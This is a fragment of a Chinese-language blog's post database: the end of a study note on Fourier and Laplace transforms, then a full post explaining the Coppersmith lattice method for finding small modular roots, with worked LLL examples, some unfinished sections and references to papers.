处连续，则<br>$$<br>\\int_{-\\infty}^{+\\infty}f(t)\\delta(t-t_0)\\mathrm{d}t = f(t_0)<br>$$</p>\n<p>这是一个很好的<strong>筛选性质</strong>。同时其傅里叶变换也很有意思：<br>$$<br>F(\\omega) = \\mathscr{F}[\\delta(t)] = \\int_{-\\infty}^{+\\infty}\\delta(t)e^{-\\mathrm{i}\\omega t}\\mathrm{d}t = e^{-\\mathrm{i}\\omega t}|_{t=0} = 1 \\\\<br>\\delta(t) = \\mathscr{F}^{-1}[1] = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega<br>$$</p>\n<h3 id=\"Fourier-变换的性质\"><a href=\"#Fourier-变换的性质\" class=\"headerlink\" title=\"Fourier 变换的性质\"></a>Fourier 变换的性质</h3><h3 id=\"Fourier-变换的卷积性质\"><a href=\"#Fourier-变换的卷积性质\" class=\"headerlink\" title=\"Fourier 变换的卷积性质\"></a>Fourier 变换的卷积性质</h3><p>简单来说，就是<br>$$<br>f_1(t)*f_2(t) = \\int_{-\\infty}^{+\\infty}f_1(\\tau)f_2(t-\\tau)\\mathrm{d}\\tau<br>$$</p>\n<h2 id=\"Laplace-变换\"><a href=\"#Laplace-变换\" class=\"headerlink\" title=\"Laplace 变换\"></a>Laplace 变换</h2><h3 id=\"Laplace-变换的概念\"><a href=\"#Laplace-变换的概念\" class=\"headerlink\" title=\"Laplace 变换的概念\"></a>Laplace 变换的概念</h3><p><strong>例</strong> 求指数函数 $f(t)=e^{kt} ,k \\in \\mathbb{R}$ 的 Laplace 变换。<br><strong>解</strong> $$<br>\\begin{aligned}<br>F(s)<br>&amp;=\\mathscr{L}[f(t)]\\\\<br>&amp;=\\int_{0}^{\\infty}e^{kt}e^{-st}\\mathrm{d}t\\\\<br>&amp;=\\frac{1}{s-k} \\quad, \\mathrm{Re}(s)&gt;k<br>\\end{aligned}$$</p>\n<p>类似地， $f(t)=\\cos kt$ 的 Laplace 变换为 $F(s)=\\frac{s}{s^2+k^2}$ ， $f(t)=\\sin kt$ 的 Laplace 变换为 $F(s)=\\frac{k}{s^2+k^2}$ 。</p>\n<h3 id=\"Laplace-变换的性质\"><a href=\"#Laplace-变换的性质\" class=\"headerlink\" title=\"Laplace 变换的性质\"></a>Laplace 变换的性质</h3><p>$$<br>\\mathscr{L}[f’(t)]=sF(s)-f(0) \\\\<br>$$<br>更一般地，有<br>$$<br>\\mathscr{L}[f^{(n)}(t)]=s^nF(s) - s^{n-1}f(0) - s^{n-2}f’(0) - \\cdots - f^{(n-1)}(0)<br>$$</p>\n<h3 id=\"Laplace-逆变换\"><a href=\"#Laplace-逆变换\" class=\"headerlink\" title=\"Laplace 逆变换\"></a>Laplace 逆变换</h3><p><strong>例</strong> 求 $F(s)=\\frac{1}{s^2(s+1)}$ 的 Laplace 逆变换。<br><strong>解</strong> 函数 $F(s)$满足条件 $\\lim\\limits_{s \\to 0}F(s)=0$ ，且 $s=0$ 是 $F(s)$ 的二级极点， $s=-1$是 $F(s)$的一级极点，故<br>$$<br>\\begin{aligned}<br>f(t) = \\mathscr{L}^{-1}[F(s)]<br>&amp;= \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},0\\right] + \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},-1\\right] \\\\<br>&amp;= (t-1) + e^{-t},\\quad t &gt; 0<br>\\end{aligned}<br>$$</p>\n<h3 id=\"卷积\"><a href=\"#卷积\" class=\"headerlink\" title=\"卷积\"></a>卷积</h3><h3 id=\"Laplace-变换的应用\"><a href=\"#Laplace-变换的应用\" class=\"headerlink\" title=\"Laplace 变换的应用\"></a>Laplace 变换的应用</h3><p><strong>例</strong> 求解微分方程 $y’’+\\omega^2y(t)=0, y(0)=0, y’(0)=\\omega$ 。</p>\n<p><strong>解</strong> 令 $Y(s)=\\mathscr{L}[y(t)]$ ，对方程两边取 Laplace 变换，得<br>$$<br>s^2Y(s)-sy(0)-y’(0)+\\omega^2Y(s)=0<br>$$<br>代入初值条件，得<br>$$<br>s^2Y(s)-\\omega+\\omega^2Y(s)=0 \\\\<br>\\Rightarrow Y(s)=\\frac{\\omega}{s^2+\\omega^2}<br>$$<br>求逆变换，得<br>$$<br>\\begin{aligned}<br>y(t)=\\mathscr{L}^{-1}\\left[\\frac{\\omega}{s^2+\\omega^2}\\right] &amp;= \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},w\\mathrm{i}\\right] + \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},-w\\mathrm{i}\\right] \\\\<br>&amp;= \\lim_{s\\to w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)’} + \\lim_{s\\to -w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)’} \\\\<br>&amp;=\\frac{we^w\\mathrm{i}t}{2w\\mathrm{i}}+\\frac{we^{-w\\mathrm{i}t}}{-2w\\mathrm{i}} \\\\<br>&amp;=\\frac{2\\mathrm{i}\\sin wt}{2\\mathrm{i}}=\\sin wt<br>\\end{aligned}<br>$$</p>"},{"title":"Coppersmith","date":"2022-10-15T11:30:00.000Z","_content":"\n研究一些多元 Coppersmith\n\n<!--more-->\n\n## 前言\n\n不知不觉学密码有半年了，从最开始的 RSA 到格再到奇奇怪怪的东西，不禁感慨数学确实有趣。\n之前的 MRCTF 的题有道三元 Coppersmith ，可惜当时水平太过低微，既做不出来也看不懂 exp ，如今再回来补这个坑，就差不多可以往生 pwn 了。\n\n## 后记\n\n这篇文章搁了很久，pwn 由于一些原因也没怎么做，还是在密码里打点小工。刚好天枢的 CTF 有一道 Coppersmith，吃了没基础的亏，论文都看不懂。\n\n## Coppersmith 的大致思想\n\n可以参考 Tover 爷的[这篇文章](https://tover.xyz/p/d3factor-coppersmith/#%E6%A8%A1N%E4%B8%8B%E7%9A%84%E4%BA%8C%E5%85%83Coppersmith)。\n\n### 模根与整根\n\nRSA 的许多攻击都可以化成解模根的问题，而所谓解模根就是方程在模数 $N$ 下的解。这时候直接解是不现实的，就需要用到 Coppersmith 方法。\n解模根的关键就是 **Howgrave-Graham** 定理：\n令 $h(x_1,...,x_n) \\in Z[x_1,...,x_n]$ 为一个至多含 $\\omega$ 个单项式的整数多项式，若满足\n$$\nh(x_1^{(0)},...,x_n^{(0)}) \\equiv 0 \\mod N^m \\enspace for\\enspace some\\enspace |x_1^{(0)}| < X_1,\\dots,|x_n^{(0)}| < X_n ,\\enspace and  \\\\\\\\\n||h(x_1X_1,\\dots,x_nX_n)|| < \\frac{N^m}{\\sqrt{\\omega}}\n$$\n则 $h(x_1^{(0)},...,x_n^{(0)}) = 0$ 在整数域上成立。\n\n不难看出，这个定理实际是将模方程转化成我们所常见的整数方程，这样，我们就可以用一些常见的方法（如牛顿迭代法）来求解了。\n\n如 GF(323) 上的方程\n$$\nF(x) = x^2 + 33x + 215 \\equiv 0 \\pmod{323}\n$$\n由韦达定理就能看出，这个方程在整数域下是解不出来实根的，但是我们稍微变换一下，变为如下形式，\n记 $M = 323$\n$$\nG(x) = 9F(x) - M(x+6) = 9x^2 - 26x - 3\n$$\n注意，$G(x) \\equiv 0 \\pmod{M}$ 仍是成立的。\n但是这个时候，肉眼分解 $G(x) = (x-3)(9x+1)$ 就能得到根 $x_0=3$，而这个根代入原始方程也是成立的。\n\nCoppersmith 就是利用这个思想，往方程加入一些模 $M$ 为零的项，使得方程满足 Howgrave-Graham 定理的条件，然后再用整数域的方法求解。\n\n## 单变量 Coppersmith 的实现\n\n一个比较基础是方法是构造一个简单的矩阵跑 LLL。直接上例子：\n\n$$\nF(x) = x^3 + 10x^2 + 5000x − 222\n$$\n\n我们可以构造矩阵\n\n$$\nB=\n\\begin{pmatrix}\nM & 0 & 0 & 0 \\\\\\\\\n0 & MX & 0 & 0 \\\\\\\\\n0 & 0 & MX^2 & 0 \\\\\\\\\n-222 & 5000X & 10X^2 & X^3\n\\end{pmatrix}\n$$\n\n可以理解成 LLL 的过程中用前面三行对最后一行进行了一些加减操作，使得最后一行的系数变得很小，而实际上系数变小就是为了满足 Howgrave-Graham 定理的界。\n\nLLL 后我们得到向量 $(444, 10, −2000, −2000)$，对应的多项式为 $G(x) = 444+x-20x^2-2x^3$，这个多项式在整数域上的根 $x_0=4$ 即为原方程的根。\n\n然而以上的方法需要满足 $M^dX^{d(d+1)/2} =\\det(L) < M^{d+1}$，更精确来说是 $2^{d/4}M^{d/(d+1)}X^{d/2} < M/\\sqrt{d + 1}$（证明不难，即 LLL 得到的最短向量小于 HG 定理的界），可以看出 $X$ 越小这个条件越容易满足，但是我们的研究通常是把 $X$ 的界往上扩的，这时我们就可以加一些 x-shift 的多项式(关于这个词，总感觉翻译成 x 的移位多项式比较怪，本文就保留原英文称谓了)。\n\n如果你细心去算了，就会发现上面的例子其实是不符合条件的，因为 LLL 给出的是最坏的界，我们算条件也是用这个最坏的界，上面恰好得到了一个更好（即更短）的向量。\n\n感觉这篇文又要鸽了，没看懂他例子的格是怎么造出来的。\n\n## 二元 Coppersmith\n\n### 结式\n\n## 三元 Coppersmith\n\n### 参数解释\n\n论文里 $X,Y$ 和 $Z$ 不难理解是三个变量对应的界，但除此之外还有 $W,\\tau$ 和 $m$ 的选取，这也是我当前很迷糊的点，下面简单探讨一下。\n\n首先是最简单的 $W$ ，论文明确给出 $W=||f(x_1X_n,\\dots,x_nX_n)||\\_\\infty$ ，而 $||f(x_1,\\dots,x_n)||_{\\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。如 $f=2x^2+3x+4$ ， $X=2$ ，则 $||f(x_1X_n,\\dots,x_nX_n)||=8x^2+6x+4$ ，显然最大系数在 $x^2$ 那，即 $W=8$ 。\n~~然后 $\\tau$ 和 $m$ 目前我也不知道咋算（）~~\n\n## 杂谈\n\n直到现在才反应过来 paper 的引用名中后面的数字是年份（）\n\n## 参考\n\n- [知乎 -「:=」和「=:」的区别是什么？](https://www.zhihu.com/question/29969904)\n- [Santanu Sarkar and Subhamoy Maitra. Some Applications of Lattice Based Root Finding Techniques](https://link.springer.com/chapter/10.1007/11935230_18)\n- [[ELL06] E. Jochemsz and A. May. A strategy for finding roots of multivariate polynomials with new applications in attacking RSA variants, Asiacrypt 2006, LNCS 4284, pp. 267–282, 2006.](https://www.cs.umd.edu/~gasarch/TOPICS/attackingRSA.pdf)\n- [Coppersmith’s Method and Related Applications](https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch19.pdf)\n- [lord. Way to CopperSmith](https://lord-riot.github.io/2021/01/06/Way-to-CopperSmith/)\n","source":"_posts/Coppersmith.md","raw":"---\ntitle: Coppersmith\ndate: 2022-10-15 19:30:00\ntags: [数学, 抽象代数, Crypto, 论文]\ncategories: 数学\n---\n\n研究一些多元 Coppersmith\n\n<!--more-->\n\n## 前言\n\n不知不觉学密码有半年了，从最开始的 RSA 到格再到奇奇怪怪的东西，不禁感慨数学确实有趣。\n之前的 MRCTF 的题有道三元 Coppersmith ，可惜当时水平太过低微，既做不出来也看不懂 exp ，如今再回来补这个坑，就差不多可以往生 pwn 了。\n\n## 后记\n\n这篇文章搁了很久，pwn 由于一些原因也没怎么做，还是在密码里打点小工。刚好天枢的 CTF 有一道 Coppersmith，吃了没基础的亏，论文都看不懂。\n\n## Coppersmith 的大致思想\n\n可以参考 Tover 爷的[这篇文章](https://tover.xyz/p/d3factor-coppersmith/#%E6%A8%A1N%E4%B8%8B%E7%9A%84%E4%BA%8C%E5%85%83Coppersmith)。\n\n### 模根与整根\n\nRSA 的许多攻击都可以化成解模根的问题，而所谓解模根就是方程在模数 $N$ 下的解。这时候直接解是不现实的，就需要用到 Coppersmith 方法。\n解模根的关键就是 **Howgrave-Graham** 定理：\n令 $h(x_1,...,x_n) \\in Z[x_1,...,x_n]$ 为一个至多含 $\\omega$ 个单项式的整数多项式，若满足\n$$\nh(x_1^{(0)},...,x_n^{(0)}) \\equiv 0 \\mod N^m \\enspace for\\enspace some\\enspace |x_1^{(0)}| < X_1,\\dots,|x_n^{(0)}| < X_n ,\\enspace and  \\\\\\\\\n||h(x_1X_1,\\dots,x_nX_n)|| < \\frac{N^m}{\\sqrt{\\omega}}\n$$\n则 $h(x_1^{(0)},...,x_n^{(0)}) = 0$ 在整数域上成立。\n\n不难看出，这个定理实际是将模方程转化成我们所常见的整数方程，这样，我们就可以用一些常见的方法（如牛顿迭代法）来求解了。\n\n如 GF(323) 上的方程\n$$\nF(x) = x^2 + 33x + 215 \\equiv 0 \\pmod{323}\n$$\n由韦达定理就能看出，这个方程在整数域下是解不出来实根的，但是我们稍微变换一下，变为如下形式，\n记 $M = 323$\n$$\nG(x) = 9F(x) - M(x+6) = 9x^2 - 26x - 3\n$$\n注意，$G(x) \\equiv 0 \\pmod{M}$ 仍是成立的。\n但是这个时候，肉眼分解 $G(x) = (x-3)(9x+1)$ 就能得到根 $x_0=3$，而这个根代入原始方程也是成立的。\n\nCoppersmith 就是利用这个思想，往方程加入一些模 $M$ 为零的项，使得方程满足 Howgrave-Graham 定理的条件，然后再用整数域的方法求解。\n\n## 单变量 Coppersmith 的实现\n\n一个比较基础是方法是构造一个简单的矩阵跑 LLL。直接上例子：\n\n$$\nF(x) = x^3 + 10x^2 + 5000x − 222\n$$\n\n我们可以构造矩阵\n\n$$\nB=\n\\begin{pmatrix}\nM & 0 & 0 & 0 \\\\\\\\\n0 & MX & 0 & 0 \\\\\\\\\n0 & 0 & MX^2 & 0 \\\\\\\\\n-222 & 5000X & 10X^2 & X^3\n\\end{pmatrix}\n$$\n\n可以理解成 LLL 的过程中用前面三行对最后一行进行了一些加减操作，使得最后一行的系数变得很小，而实际上系数变小就是为了满足 Howgrave-Graham 定理的界。\n\nLLL 后我们得到向量 $(444, 10, −2000, −2000)$，对应的多项式为 $G(x) = 444+x-20x^2-2x^3$，这个多项式在整数域上的根 $x_0=4$ 即为原方程的根。\n\n然而以上的方法需要满足 $M^dX^{d(d+1)/2} =\\det(L) < M^{d+1}$，更精确来说是 $2^{d/4}M^{d/(d+1)}X^{d/2} < M/\\sqrt{d + 1}$（证明不难，即 LLL 得到的最短向量小于 HG 定理的界），可以看出 $X$ 越小这个条件越容易满足，但是我们的研究通常是把 $X$ 的界往上扩的，这时我们就可以加一些 x-shift 的多项式(关于这个词，总感觉翻译成 x 的移位多项式比较怪，本文就保留原英文称谓了)。\n\n如果你细心去算了，就会发现上面的例子其实是不符合条件的，因为 LLL 给出的是最坏的界，我们算条件也是用这个最坏的界，上面恰好得到了一个更好（即更短）的向量。\n\n感觉这篇文又要鸽了，没看懂他例子的格是怎么造出来的。\n\n## 二元 Coppersmith\n\n### 结式\n\n## 三元 Coppersmith\n\n### 参数解释\n\n论文里 $X,Y$ 和 $Z$ 不难理解是三个变量对应的界，但除此之外还有 $W,\\tau$ 和 $m$ 的选取，这也是我当前很迷糊的点，下面简单探讨一下。\n\n首先是最简单的 $W$ ，论文明确给出 $W=||f(x_1X_n,\\dots,x_nX_n)||\\_\\infty$ ，而 $||f(x_1,\\dots,x_n)||_{\\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。如 $f=2x^2+3x+4$ ， $X=2$ ，则 $||f(x_1X_n,\\dots,x_nX_n)||=8x^2+6x+4$ ，显然最大系数在 $x^2$ 那，即 $W=8$ 。\n~~然后 $\\tau$ 和 $m$ 目前我也不知道咋算（）~~\n\n## 杂谈\n\n直到现在才反应过来 paper 的引用名中后面的数字是年份（）\n\n## 参考\n\n- [知乎 -「:=」和「=:」的区别是什么？](https://www.zhihu.com/question/29969904)\n- [Santanu Sarkar and Subhamoy Maitra. Some Applications of Lattice Based Root Finding Techniques](https://link.springer.com/chapter/10.1007/11935230_18)\n- [[ELL06] E. Jochemsz and A. May. A strategy for finding roots of multivariate polynomials with new applications in attacking RSA variants, Asiacrypt 2006, LNCS 4284, pp. 267–282, 2006.](https://www.cs.umd.edu/~gasarch/TOPICS/attackingRSA.pdf)\n- [Coppersmith’s Method and Related Applications](https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch19.pdf)\n- [lord. Way to CopperSmith](https://lord-riot.github.io/2021/01/06/Way-to-CopperSmith/)\n","slug":"Coppersmith","published":1,"updated":"2024-06-05T07:53:05.225Z","_id":"cl9fiq3eu0000446g5bx39mt0","comments":1,"layout":"post","photos":[],"content":"<p>研究一些多元 Coppersmith</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>不知不觉学密码有半年了，从最开始的 RSA 到格再到奇奇怪怪的东西，不禁感慨数学确实有趣。<br>之前的 MRCTF 的题有道三元 Coppersmith ，可惜当时水平太过低微，既做不出来也看不懂 exp ，如今再回来补这个坑，就差不多可以往生 pwn 了。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>这篇文章搁了很久，pwn 由于一些原因也没怎么做，还是在密码里打点小工。刚好天枢的 CTF 有一道 Coppersmith，吃了没基础的亏，论文都看不懂。</p>\n<h2 id=\"Coppersmith-的大致思想\"><a href=\"#Coppersmith-的大致思想\" class=\"headerlink\" title=\"Coppersmith 的大致思想\"></a>Coppersmith 的大致思想</h2><p>可以参考 Tover 爷的<a href=\"https://tover.xyz/p/d3factor-coppersmith/#%E6%A8%A1N%E4%B8%8B%E7%9A%84%E4%BA%8C%E5%85%83Coppersmith\">这篇文章</a>。</p>\n<h3 id=\"模根与整根\"><a href=\"#模根与整根\" class=\"headerlink\" title=\"模根与整根\"></a>模根与整根</h3><p>RSA 的许多攻击都可以化成解模根的问题，而所谓解模根就是方程在模数 $N$ 下的解。这时候直接解是不现实的，就需要用到 Coppersmith 方法。<br>解模根的关键就是 <strong>Howgrave-Graham</strong> 定理：<br>令 $h(x_1,…,x_n) \\in Z[x_1,…,x_n]$ 为一个至多含 $\\omega$ 个单项式的整数多项式，若满足<br>$$<br>h(x_1^{(0)},…,x_n^{(0)}) \\equiv 0 \\mod N^m \\enspace for\\enspace some\\enspace |x_1^{(0)}| &lt; X_1,\\dots,|x_n^{(0)}| &lt; X_n ,\\enspace and  \\\\<br>||h(x_1X_1,\\dots,x_nX_n)|| &lt; \\frac{N^m}{\\sqrt{\\omega}}<br>$$<br>则 $h(x_1^{(0)},…,x_n^{(0)}) = 0$ 在整数域上成立。</p>\n<p>不难看出，这个定理实际是将模方程转化成我们所常见的整数方程，这样，我们就可以用一些常见的方法（如牛顿迭代法）来求解了。</p>\n<p>如 GF(323) 上的方程<br>$$<br>F(x) = x^2 + 33x + 215 \\equiv 0 \\pmod{323}<br>$$<br>由韦达定理就能看出，这个方程在整数域下是解不出来实根的，但是我们稍微变换一下，变为如下形式，<br>记 $M = 323$<br>$$<br>G(x) = 9F(x) - M(x+6) = 9x^2 - 26x - 3<br>$$<br>注意，$G(x) \\equiv 0 \\pmod{M}$ 仍是成立的。<br>但是这个时候，肉眼分解 $G(x) = (x-3)(9x+1)$ 就能得到根 $x_0=3$，而这个根代入原始方程也是成立的。</p>\n<p>Coppersmith 就是利用这个思想，往方程加入一些模 $M$ 为零的项，使得方程满足 Howgrave-Graham 定理的条件，然后再用整数域的方法求解。</p>\n<h2 id=\"单变量-Coppersmith-的实现\"><a href=\"#单变量-Coppersmith-的实现\" class=\"headerlink\" title=\"单变量 Coppersmith 的实现\"></a>单变量 Coppersmith 的实现</h2><p>一个比较基础是方法是构造一个简单的矩阵跑 LLL。直接上例子：</p>\n<p>$$<br>F(x) = x^3 + 10x^2 + 5000x − 222<br>$$</p>\n<p>我们可以构造矩阵</p>\n<p>$$<br>B=<br>\\begin{pmatrix}<br>M &amp; 0 &amp; 0 &amp; 0 \\\\<br>0 &amp; MX &amp; 0 &amp; 0 \\\\<br>0 &amp; 0 &amp; MX^2 &amp; 0 \\\\<br>-222 &amp; 5000X &amp; 10X^2 &amp; X^3<br>\\end{pmatrix}<br>$$</p>\n<p>可以理解成 LLL 的过程中用前面三行对最后一行进行了一些加减操作，使得最后一行的系数变得很小，而实际上系数变小就是为了满足 Howgrave-Graham 定理的界。</p>\n<p>LLL 后我们得到向量 $(444, 10, −2000, −2000)$，对应的多项式为 $G(x) = 444+x-20x^2-2x^3$，这个多项式在整数域上的根 $x_0=4$ 即为原方程的根。</p>\n<p>然而以上的方法需要满足 $M^dX^{d(d+1)/2} =\\det(L) &lt; M^{d+1}$，更精确来说是 $2^{d/4}M^{d/(d+1)}X^{d/2} &lt; M/\\sqrt{d + 1}$（证明不难，即 LLL 得到的最短向量小于 HG 定理的界），可以看出 $X$ 越小这个条件越容易满足，但是我们的研究通常是把 $X$ 的界往上扩的，这时我们就可以加一些 x-shift 的多项式(关于这个词，总感觉翻译成 x 的移位多项式比较怪，本文就保留原英文称谓了)。</p>\n<p>如果你细心去算了，就会发现上面的例子其实是不符合条件的，因为 LLL 给出的是最坏的界，我们算条件也是用这个最坏的界，上面恰好得到了一个更好（即更短）的向量。</p>\n<p>感觉这篇文又要鸽了，没看懂他例子的格是怎么造出来的。</p>\n<h2 id=\"二元-Coppersmith\"><a href=\"#二元-Coppersmith\" class=\"headerlink\" title=\"二元 Coppersmith\"></a>二元 Coppersmith</h2><h3 id=\"结式\"><a href=\"#结式\" class=\"headerlink\" title=\"结式\"></a>结式</h3><h2 id=\"三元-Coppersmith\"><a href=\"#三元-Coppersmith\" class=\"headerlink\" title=\"三元 Coppersmith\"></a>三元 Coppersmith</h2><h3 id=\"参数解释\"><a href=\"#参数解释\" class=\"headerlink\" title=\"参数解释\"></a>参数解释</h3><p>论文里 $X,Y$ 和 $Z$ 不难理解是三个变量对应的界，但除此之外还有 $W,\\tau$ 和 $m$ 的选取，这也是我当前很迷糊的点，下面简单探讨一下。</p>\n<p>首先是最简单的 $W$ ，论文明确给出 $W=||f(x_1X_n,\\dots,x_nX_n)||_\\infty$ ，而 $||f(x_1,\\dots,x_n)||_{\\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。如 $f=2x^2+3x+4$ ， $X=2$ ，则 $||f(x_1X_n,\\dots,x_nX_n)||=8x^2+6x+4$ ，显然最大系数在 $x^2$ 那，即 $W=8$ 。<br><del>然后 $\\tau$ 和 $m$ 目前我也不知道咋算（）</del></p>\n<h2 id=\"杂谈\"><a href=\"#杂谈\" class=\"headerlink\" title=\"杂谈\"></a>杂谈</h2><p>直到现在才反应过来 paper 的引用名中后面的数字是年份（）</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://www.zhihu.com/question/29969904\">知乎 -「:=」和「=:」的区别是什么？</a></li>\n<li><a href=\"https://link.springer.com/chapter/10.1007/11935230_18\">Santanu Sarkar and Subhamoy Maitra. Some Applications of Lattice Based Root Finding Techniques</a></li>\n<li><a href=\"https://www.cs.umd.edu/~gasarch/TOPICS/attackingRSA.pdf\">[ELL06] E. Jochemsz and A. May. A strategy for finding roots of multivariate polynomials with new applications in attacking RSA variants, Asiacrypt 2006, LNCS 4284, pp. 267–282, 2006.</a></li>\n<li><a href=\"https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch19.pdf\">Coppersmith’s Method and Related Applications</a></li>\n<li><a href=\"https://lord-riot.github.io/2021/01/06/Way-to-CopperSmith/\">lord. Way to CopperSmith</a></li>\n</ul>\n","excerpt":"<p>研究一些多元 Coppersmith</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>不知不觉学密码有半年了，从最开始的 RSA 到格再到奇奇怪怪的东西，不禁感慨数学确实有趣。<br>之前的 MRCTF 的题有道三元 Coppersmith ，可惜当时水平太过低微，既做不出来也看不懂 exp ，如今再回来补这个坑，就差不多可以往生 pwn 了。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>这篇文章搁了很久，pwn 由于一些原因也没怎么做，还是在密码里打点小工。刚好天枢的 CTF 有一道 Coppersmith，吃了没基础的亏，论文都看不懂。</p>\n<h2 id=\"Coppersmith-的大致思想\"><a href=\"#Coppersmith-的大致思想\" class=\"headerlink\" title=\"Coppersmith 的大致思想\"></a>Coppersmith 的大致思想</h2><p>可以参考 Tover 爷的<a href=\"https://tover.xyz/p/d3factor-coppersmith/#%E6%A8%A1N%E4%B8%8B%E7%9A%84%E4%BA%8C%E5%85%83Coppersmith\">这篇文章</a>。</p>\n<h3 id=\"模根与整根\"><a href=\"#模根与整根\" class=\"headerlink\" title=\"模根与整根\"></a>模根与整根</h3><p>RSA 的许多攻击都可以化成解模根的问题，而所谓解模根就是方程在模数 $N$ 下的解。这时候直接解是不现实的，就需要用到 Coppersmith 方法。<br>解模根的关键就是 <strong>Howgrave-Graham</strong> 定理：<br>令 $h(x_1,…,x_n) \\in Z[x_1,…,x_n]$ 为一个至多含 $\\omega$ 个单项式的整数多项式，若满足<br>$$<br>h(x_1^{(0)},…,x_n^{(0)}) \\equiv 0 \\mod N^m \\enspace for\\enspace some\\enspace |x_1^{(0)}| &lt; X_1,\\dots,|x_n^{(0)}| &lt; X_n ,\\enspace and  \\\\<br>||h(x_1X_1,\\dots,x_nX_n)|| &lt; \\frac{N^m}{\\sqrt{\\omega}}<br>$$<br>则 $h(x_1^{(0)},…,x_n^{(0)}) = 0$ 在整数域上成立。</p>\n<p>不难看出，这个定理实际是将模方程转化成我们所常见的整数方程，这样，我们就可以用一些常见的方法（如牛顿迭代法）来求解了。</p>\n<p>如 GF(323) 上的方程<br>$$<br>F(x) = x^2 + 33x + 215 \\equiv 0 \\pmod{323}<br>$$<br>由韦达定理就能看出，这个方程在整数域下是解不出来实根的，但是我们稍微变换一下，变为如下形式，<br>记 $M = 323$<br>$$<br>G(x) = 9F(x) - M(x+6) = 9x^2 - 26x - 3<br>$$<br>注意，$G(x) \\equiv 0 \\pmod{M}$ 仍是成立的。<br>但是这个时候，肉眼分解 $G(x) = (x-3)(9x+1)$ 就能得到根 $x_0=3$，而这个根代入原始方程也是成立的。</p>\n<p>Coppersmith 就是利用这个思想，往方程加入一些模 $M$ 为零的项，使得方程满足 Howgrave-Graham 定理的条件，然后再用整数域的方法求解。</p>\n<h2 id=\"单变量-Coppersmith-的实现\"><a href=\"#单变量-Coppersmith-的实现\" class=\"headerlink\" title=\"单变量 Coppersmith 的实现\"></a>单变量 Coppersmith 的实现</h2><p>一个比较基础是方法是构造一个简单的矩阵跑 LLL。直接上例子：</p>\n<p>$$<br>F(x) = x^3 + 10x^2 + 5000x − 222<br>$$</p>\n<p>我们可以构造矩阵</p>\n<p>$$<br>B=<br>\\begin{pmatrix}<br>M &amp; 0 &amp; 0 &amp; 0 \\\\<br>0 &amp; MX &amp; 0 &amp; 0 \\\\<br>0 &amp; 0 &amp; MX^2 &amp; 0 \\\\<br>-222 &amp; 5000X &amp; 10X^2 &amp; X^3<br>\\end{pmatrix}<br>$$</p>\n<p>可以理解成 LLL 的过程中用前面三行对最后一行进行了一些加减操作，使得最后一行的系数变得很小，而实际上系数变小就是为了满足 Howgrave-Graham 定理的界。</p>\n<p>LLL 后我们得到向量 $(444, 10, −2000, −2000)$，对应的多项式为 $G(x) = 444+x-20x^2-2x^3$，这个多项式在整数域上的根 $x_0=4$ 即为原方程的根。</p>\n<p>然而以上的方法需要满足 $M^dX^{d(d+1)/2} =\\det(L) &lt; M^{d+1}$，更精确来说是 $2^{d/4}M^{d/(d+1)}X^{d/2} &lt; M/\\sqrt{d + 1}$（证明不难，即 LLL 得到的最短向量小于 HG 定理的界），可以看出 $X$ 越小这个条件越容易满足，但是我们的研究通常是把 $X$ 的界往上扩的，这时我们就可以加一些 x-shift 的多项式(关于这个词，总感觉翻译成 x 的移位多项式比较怪，本文就保留原英文称谓了)。</p>\n<p>如果你细心去算了，就会发现上面的例子其实是不符合条件的，因为 LLL 给出的是最坏的界，我们算条件也是用这个最坏的界，上面恰好得到了一个更好（即更短）的向量。</p>\n<p>感觉这篇文又要鸽了，没看懂他例子的格是怎么造出来的。</p>\n<h2 id=\"二元-Coppersmith\"><a href=\"#二元-Coppersmith\" class=\"headerlink\" title=\"二元 Coppersmith\"></a>二元 Coppersmith</h2><h3 id=\"结式\"><a href=\"#结式\" class=\"headerlink\" title=\"结式\"></a>结式</h3><h2 id=\"三元-Coppersmith\"><a href=\"#三元-Coppersmith\" class=\"headerlink\" title=\"三元 Coppersmith\"></a>三元 Coppersmith</h2><h3 id=\"参数解释\"><a href=\"#参数解释\" class=\"headerlink\" title=\"参数解释\"></a>参数解释</h3><p>论文里 $X,Y$ 和 $Z$ 不难理解是三个变量对应的界，但除此之外还有 $W,\\tau$ 和 $m$ 的选取，这也是我当前很迷糊的点，下面简单探讨一下。</p>\n<p>首先是最简单的 $W$ ，论文明确给出 $W=||f(x_1X_n,\\dots,x_nX_n)||_\\infty$ ，而 $||f(x_1,\\dots,x_n)||_{\\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。如 $f=2x^2+3x+4$ ， $X=2$ ，则 $||f(x_1X_n,\\dots,x_nX_n)||=8x^2+6x+4$ ，显然最大系数在 $x^2$ 那，即 $W=8$ 。<br><del>然后 $\\tau$ 和 $m$ 目前我也不知道咋算（）</del></p>\n<h2 id=\"杂谈\"><a href=\"#杂谈\" class=\"headerlink\" title=\"杂谈\"></a>杂谈</h2><p>直到现在才反应过来 paper 